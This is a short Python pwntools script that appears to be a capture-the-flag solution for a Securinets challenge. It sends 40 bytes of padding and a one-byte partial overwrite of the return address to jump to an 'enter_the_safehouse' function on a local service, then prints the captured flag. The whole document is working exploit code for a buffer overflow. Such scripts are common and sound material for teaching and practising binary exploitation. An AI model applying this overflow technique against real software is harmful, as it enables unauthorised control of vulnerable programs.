#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
elf = ELF("./main", checksec=False)

io = remote("127.0.0.1", 9007)

payload = b"A" * 40
payload += p8(elf.symbols["enter_the_safehouse"] & 0xff)

io.sendafter(b"FINAL TURN: ", payload)
io.recvuntil(b"Securinets{")
flag = b"Securinets{" + io.recvuntil(b"}")
print(flag.decode())
io.close()
